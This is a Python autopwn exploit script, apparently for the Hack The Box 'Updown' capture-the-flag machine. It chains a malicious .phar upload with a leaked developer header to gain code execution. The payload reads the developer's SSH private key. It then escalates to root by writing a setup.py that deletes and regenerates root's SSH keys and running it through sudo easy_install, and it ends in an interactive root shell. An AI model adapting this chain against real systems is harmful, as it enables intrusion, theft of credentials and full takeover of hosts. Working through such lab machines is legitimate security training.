#!/usr/bin/env python3

"""
Autopwn Updown HTB Machine
--------------------------
Author: Marss
Date: Oct 21, 2022
"""

import paramiko
import requests
import signal
import sys
import threading
import time

from bs4 import BeautifulSoup
from pwn import *

# Ctrl + c (function)
def signal_handler(signum, frame): sys.exit('\n[!] User terminated.')

# Ctrl + c (signal)
signal.signal(signal.SIGINT, signal_handler)

# Main class
class Exploit:
	def __init__(self):
		self.target_url = 'http://dev.siteisup.htb'
		self.malicious_file = 'remote_code_execution.phar'

	def run(self):
		progress = log.progress('Starting attack')

		# (1) UPLOAD FILE 
		progress.status('Uploading file')

		upload_file_thread = threading.Thread(target=self.upload_file)
		upload_file_thread.start()
		
		time.sleep(3) # wait until the file has been uploaded
		log.info(f'File Uploaded: {self.malicious_file}')

		# (2) EXECUTE FILE
		progress.status('Executing file')
		
		id_rsa_output = self.execute_file()
		log.info(f'Payload executed')

		# (3) SAVE DEVELOPER ID_RSA
		progress.status('Extracting id_rsa keys')

		private_key_name = 'id_rsa_developer'
		self.create_file(private_key_name, id_rsa_output)
		log.info(f'Developer id_rsa: ./{private_key_name}')

		# (4) SSH CONNECTION (developer)
		progress.status('SSH connection')
		connection = self.ssh_connection('developer', private_key_name)

		# (5) GET ROOT SHELL WITH ROOT ID_RSA
		progress.status('Getting reverse shell')
		self.interactive_shell(connection)

	def create_file(self, file_name, file_data):
		with open(file_name, 'w') as file:
			file.write(file_data + '\n')

	def upload_file(self):
		try:
			headers = {
				'Special-Dev' : 'only4dev'
			}

			file_data = {
				'file' : (
					self.malicious_file, 
					open(self.malicious_file, 'r'), 
					'application/octet-stream'
				)
			}

			post_data = {
				'check' : 'Check'
			}

			requests.post(
				self.target_url, 
				headers=headers, 
				files=file_data, 
				data=post_data
			)

		except Exception as error:
			sys.exit('\n[x] Error: %s' % error)

	def output_command(self, response):
		output = response.replace("\nhttp://url.fake\n", "")
		output = output.replace("Enter URL here:Welcome to 'siteisup.htb' application", "").strip()

		return output
		
	def execute_file(self):
		try:
			headers = {
				'Special-Dev' : 'only4dev'
			}

			response = requests.get(self.target_url + '/uploads/', headers=headers)
			
			beauty_response = BeautifulSoup(response.text, 'html.parser')
			md5_directories = beauty_response.find_all('a')[5:]

			for md5_directory in md5_directories:
				upload_url = self.target_url + f'/uploads/{md5_directory.string}/{self.malicious_file}'
				
				response = requests.get(upload_url, headers=headers)

				if 'Not Found' in response.text:
					continue
				break

			return self.output_command(response.text)

		except Exception as error:
			sys.exit('\n[x] Error: %s' % error)

	def interactive_shell(self, connection):
		command = "mkdir /tmp/.privesc"
		_ = self.execute_command(connection, command)

		command = "echo \"__import__('os').system('rm /root/.ssh/id_rsa*')\" > /tmp/.privesc/setup.py"
		_ = self.execute_command(connection, command)

		command = "echo \"__import__('os').system('ssh-keygen -q -t rsa -f /root/.ssh/id_rsa -N \\\"\\\"')\" >> /tmp/.privesc/setup.py"
		_ = self.execute_command(connection, command)

		command = "echo \"__import__('os').system('cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys && cat /root/.ssh/id_rsa')\" >> /tmp/.privesc/setup.py"		
		_ = self.execute_command(connection, command)
		
		command = "sudo /usr/local/bin/easy_install -q /tmp/.privesc 2>/dev/null"
		id_rsa_output = self.execute_command(connection, command)

		private_key_name = 'id_rsa_root'
		self.create_file(private_key_name, id_rsa_output)
		log.info(f'Root id_rsa: ./{private_key_name}')
		
		root_client = self.ssh_connection('root', private_key_name)
		log.success('Successful ssh connection')

		_ = self.execute_command(root_client, 'rm -r /tmp/.privesc')
		
		print()
		while True:
			cmd = raw_input('~# ')
			output_command = self.execute_command(root_client, cmd)
			print(output_command)

	def execute_command(self, connection, command):
		_stdin, _stdout, _stderr = connection.exec_command(command)
		output_command = _stdout.read().decode()
		
		return output_command

	def ssh_connection(self, ssh_username, private_key_name):
		target_host = '10.10.11.177'
		ssh_private_key = paramiko.RSAKey.from_private_key_file(f"./{private_key_name}")

		try:
			client = paramiko.SSHClient()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

			client.connect(target_host, port=22, username=ssh_username, pkey=ssh_private_key)

			return client

		except Exception as error:
			sys.exit('\n[x] Error: %s' % error)

# Main flow
if __name__ == '__main__':
	ascii_tittle = """
	 _, _,_ ___  _, __, _  _ _, _   _,_ __, __,  _, _  _ _, _
    /_\ | |  |  / \ |_) |  | |\ |   | | |_) | \ / \ |  | |\ |
	| | | |  |  \ / |   |/\| | \|   | | |   |_/ \ / |/\| | \|
	~ ~ `~'  ~   ~  ~   ~  ~ ~  ~   `~' ~   ~    ~  ~  ~ ~  ~
 													   by marss
 	"""
	
	print(ascii_tittle)

	exploit = Exploit()
	
	exploit.run()